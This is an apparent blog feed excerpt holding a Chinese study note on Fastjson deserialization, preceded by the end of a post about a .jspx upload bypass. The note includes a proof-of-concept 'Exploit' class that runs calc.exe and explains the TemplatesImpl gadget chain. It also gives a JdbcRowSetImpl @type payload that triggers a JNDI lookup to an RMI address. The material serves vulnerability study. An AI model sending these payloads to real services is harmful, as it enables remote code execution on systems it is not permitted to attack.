从流程中看出，后台会将上传文件的后缀名称是否包含在上传的fileType的值中，若有则进行落地，否则报错。但是这整个过程并没有对后缀进行黑名单检查或者白名单限制。因此可以上传jspx后缀的文件。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Fastjson反序列化学习笔记（一）]]></title>
        <id>https://limpid94.github.io/post/fastjson-fan-xu-lie-hua-xue-xi-bi-ji-yi-chu-shi-lou-dong/</id>
        <link href="https://limpid94.github.io/post/fastjson-fan-xu-lie-hua-xue-xi-bi-ji-yi-chu-shi-lou-dong/">
        </link>
        <updated>2021-08-02T17:20:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="什么是fastjson">什么是Fastjson</h2>
<blockquote>
<p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p>
</blockquote>
<h2 id="使用fastjson进行序列化">使用Fastjson进行序列化</h2>
<p>Fastjson在对对象进行序列化和反序列化时，需要使用到如下三个函数：</p>
<ul>
<li><code>JSON.toJSONString()</code></li>
<li><code>JSON.parse()</code></li>
<li><code>JSON.parseObject()</code></li>
</ul>
<h3 id="一段demo">一段Demo</h3>
<p>现在先尝试使用fastjson对自定义的类进行反序列化，熟悉以下具体的操作。</p>
<pre><code class="language-java">package cc.study;

public class User {
    private Long id;
    private String name;

    public Long getId() {
        return id;
    }

    public void setId(Long id) {
        this.id = id;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }
}
</code></pre>
<p>然后编写main函数</p>
<pre><code class="language-java">package cc.study;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

import java.security.spec.EncodedKeySpec;

public class FastjsonStudy {
    public static void Enc(){
        User guestUser = new User();
        guestUser.setId(3L);
        guestUser.setName(&quot;ZHANGSAN&quot;);
        String jsonString = JSON.toJSONString(guestUser);
        System.out.println(jsonString);
    }

    public static void main(String[] args) {
        Enc();
    }
}
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://limpid94.github.io/post-images/1627985599522.PNG" alt="" loading="lazy"></figure>
<p>若要在结果中输出类型信息，需要使用<code>String jsonString = JSON.toJSONString(guestUser, SerializerFeature.WriteClassName);</code><br>
则输出的结果为：<br>
<img src="https://limpid94.github.io/post-images/1627987808220.PNG" alt="" loading="lazy"></p>
<p>接下来要了解两个反序列化方法在反序列化的结果有何不同。同样使用上面的User类，但是此时添加toString方法方便将反序列化后的类进行输出。</p>
<pre><code class="language-java">    @Override
    public String toString() {
        return &quot;User{&quot; +
                &quot;id=&quot; + id +
                &quot;, name='&quot; + name + '\'' +
                '}';
    }
</code></pre>
<p>测试的4中方法分别为</p>
<ul>
<li>第一种：JSON.parse(serializedStr)</li>
<li>第二种：JSON.parseObject(serializedStr)</li>
<li>第三种：JSON.parseObject(serializedStr, Object.class)</li>
<li>第四种：JSON.parseObject(serializedStr, User.class)</li>
</ul>
<p>测试代码如下：</p>
<pre><code class="language-java">package cc.study;

import com.alibaba.fastjson.JSON;

public class test1 {
    public static void main(String[] args) {
        String jstring = &quot;{\&quot;@type\&quot;:\&quot;cc.study.User\&quot;,\&quot;id\&quot;:3,\&quot;name\&quot;:\&quot;ZHANGSAN\&quot;}&quot;;
        System.out.println(&quot;[*] ============= 通过parse方法进行反序列化 ===========&quot;);
        System.out.println(&quot;JSON.parse(serializedStr)：&quot;);
        Object obj1 = JSON.parse(jstring);
        System.out.println(&quot;parse反序列化对象名称:&quot; + obj1.getClass().getName());
        System.out.println(&quot;parse反序列化：&quot; + obj1);
        System.out.println(&quot;-----------------------------------------------\n&quot;);
        System.out.println(&quot;JSON.parseObject(serializedStr)：&quot;);
        Object obj2 = JSON.parseObject(jstring);
        System.out.println(&quot;parseObject反序列化对象名称:&quot; + obj2.getClass().getName());
        System.out.println(&quot;parseObject反序列化:&quot; + obj2);
        System.out.println(&quot;-----------------------------------------------\n&quot;);

        //通过parseObject,指定为object.class
        System.out.println(&quot;JSON.parseObject(serializedStr, Object.class)：&quot;);
        Object obj3 = JSON.parseObject(jstring, Object.class);
        System.out.println(&quot;parseObject反序列化对象名称:&quot; + obj3.getClass().getName());
        System.out.println(&quot;parseObject反序列化:&quot; + obj3);
        System.out.println(&quot;-----------------------------------------------\n&quot;);

        //通过parseObject,指定为User.class
        System.out.println(&quot;JSON.parseObject(serializedStr, User.class)：&quot;);
        Object obj4 = JSON.parseObject(jstring, User.class);
        System.out.println(&quot;parseObject反序列化对象名称:&quot; + obj4.getClass().getName());
        System.out.println(&quot;parseObject反序列化:&quot; + obj4);
        System.out.println(&quot;-----------------------------------------------\n&quot;);
    }
}

</code></pre>
<figure data-type="image" tabindex="2"><img src="https://limpid94.github.io/post-images/1628004571112.PNG" alt="" loading="lazy"></figure>
<p>从结果可以知晓：</p>
<ul>
<li>第一种情况，在指定<code>@type</code>后会自动调用默认类的构造器（此处为User的构造器）、User类的setter方法并最终产生一个User类的实例。此处会给public修饰的赋值，而不会给private修饰的赋值。在1.2.22, 1.1.54.android之后，增加了一个SupportNonPublicField特性，就算private修饰的没有setter方法也能成功赋值。</li>
<li>第二种情况，在指定了@type的情况下，自动调用了User类默认构造器，User类对应的setter方法以及对应的getter方法，最终结果是一个字符串。</li>
<li>第三种情况，在指定了@type的情况下，这种写法和第一种JSON.parse(serializedStr)写法其实没有区别的。</li>
<li>第四种情况，在指定了@type的情况下，自动调用了User类默认构造器，User类对应的setter方法，最终生成User类的一个实例。</li>
</ul>
<h3 id="fastjson大致框架">Fastjson大致框架</h3>
<p><img src="https://limpid94.github.io/post-images/1628012127988.png" alt="" loading="lazy"><br>
<code>JSON的门面类</code>主要提供静态方法，例如parse、parseObject。而具体的实现则在<code>DefaultJSONParser</code>中。<code>ParserConfig</code>主要保存一些相关配置信息，<code>JSONLexerBase</code>这个类用来处理字符分析。而反序列化用到的<code>JavaBeanDeserializer</code>则是JavaBean反序列化处理主类。</p>
<h2 id="fastjson反序列化漏洞">Fastjson反序列化漏洞</h2>
<h3 id="产生原因">产生原因</h3>
<p>漏洞是利用fastjson autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。</p>
<h2 id="poc代码">POC代码</h2>
<p>POC在网上流传的类型可分为三类：</p>
<ol>
<li>基于TemplateImpl</li>
<li>基于JNDI Bean Property类型</li>
<li>基于JNDI Field类型</li>
</ol>
<p>在第一种情况下，基于TemplateImpl需要打开SupportNonPublic开关，受到的限制比较多</p>
<h3 id="恶意类的编写">恶意类的编写</h3>
<pre><code class="language-java">import java.io.IOException;

public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{&quot;calc.exe&quot;});
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
</code></pre>
<p>之后使用javac对其进行编译，生成Exploit.class即可。</p>
<h3 id="基于templateimpl的poc">基于TemplateImpl的POC</h3>
<p>实质：用<code>bytecode</code>字段传入恶意类，调用<code>outputProperties</code>属性的getter方法时传入恶意类并调用其构造方法，导致命令执行。</p>
<p>调用链：</p>
<p>-&gt; TemplatesImpl()<br>
-&gt; getOutputProperties()<br>
-&gt; newTransformer()<br>
-&gt; getTransletInstance()<br>
-&gt; defineTransletClasses()<br>
-&gt; newInstance()</p>
<p>在TemplatesImpl类实例化后，会执行相应的setter方法给属性赋值，而到了<code>_outputProperties</code>属性时会调用其<code>getOutputProperties()</code>方法，其中调用了<code>newTransformer()</code>方法:</p>
<pre><code class="language-java">public synchronized Properties getOutputProperties() {
        try {
            return newTransformer().getOutputProperties();
        }
        catch (TransformerConfigurationException e) {
            return null;
        }
    }
</code></pre>
<p><code>newTransformer</code>调用<code>getTransletInstance()</code>方法：<br>
<img src="https://limpid94.github.io/post-images/1628239706767.PNG" alt="" loading="lazy"><br>
其中有两个关键的方法，defineTransletClasses() 和 newInstance() ，前者是把恶意类带到数组中去，后者用于实例化<code>_class[_transletIndex]</code> 中的Class。<br>
<img src="https://limpid94.github.io/post-images/1628242435685.PNG" alt="" loading="lazy"><br>
从方法的代码可以看到其中调用了<code>defindClass</code>方法处理所传入的恶意类的字节码。第299行的<code>defineClass</code>从<code>byte[]</code>中还原出了恶意类对象并放入到了_class[]数组中<br>
而后getTransletInstance()方法调用newInstance() 反射实例化恶意类，成功执行命令<br>
<img src="https://limpid94.github.io/post-images/1628242740407.PNG" alt="" loading="lazy"></p>
<h3 id="基于jndi-bean-property类型的poc">基于JNDI Bean Property类型的POC</h3>
<pre><code class="language-json">{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:33891/Exploit&quot;,&quot;autoCommit&quot;:true}
</code></pre>
<p>本质上是Fastjson在反序列化时会调用目标类的<code>setter</code>方法，在Gadget <code>com.sun.rowset.JdbcRowSetImpl的setAutoCommit()</code>方法中调用了<code>lookup()</code>,且其参数(DataSourceName的setter方法设置)可控，导致JNDI注入,最终任意命令执行</p>
<p>利用链</p>
<p>-&gt; JdbcRowSetImpl.execute()<br>
-&gt; JdbcRowSetImpl.prepare()<br>
-&gt; JdbcRowSetImpl.connect()<br>
-&gt; InitialContext.lookup(dataSource)</p>
<p>能够使用JdbcRowSetImpl的原因是：<br>
Fastjson会调用对应的setter、getter方法，而传入的序列化字符串中含有<code>dataSourceName</code>，因此会调用<code>setDataSourceName(String dsName)</code>，其方法的源码如下：<br>
<img src="https://limpid94.github.io/post-images/1628183795947.PNG" alt="" loading="lazy"><br>
而<code>autoCommit</code>参数也会使Fastjson去调用<code>setAutoCommit</code>，其源码如下：<br>
<img src="https://limpid94.github.io/post-images/1628184214717.PNG" alt="" loading="lazy"><br>
其中调用了<code>connet()</code>方法：<br>
<img src="https://limpid94.github.io/post-images/1628184427534.PNG" alt="" loading="lazy"><br>
在该方法中的<code>getDataSourceName()</code>来获取<code>DataSourceName</code>，也就是上面的<code>setDataSourceName()</code>，因此可以构成一条利用连。</p>
<h3 id="基于jndi-field类型的poc">基于JNDI Field类型的POC</h3>
<p>暂时未找到太多的材料，之后有机会整理全再补充。</p>
<h2 id="参考材料">参考材料</h2>
<p>http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</p>
<p>https://www.freebuf.com/column/216631.html</p>
<p>https://paper.seebug.org/1274/<br>
https://5alt.me/2017/09/fastjson%E8%B0%83%E8%AF%95%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</p>
]]></content>
    </entry>
</feed>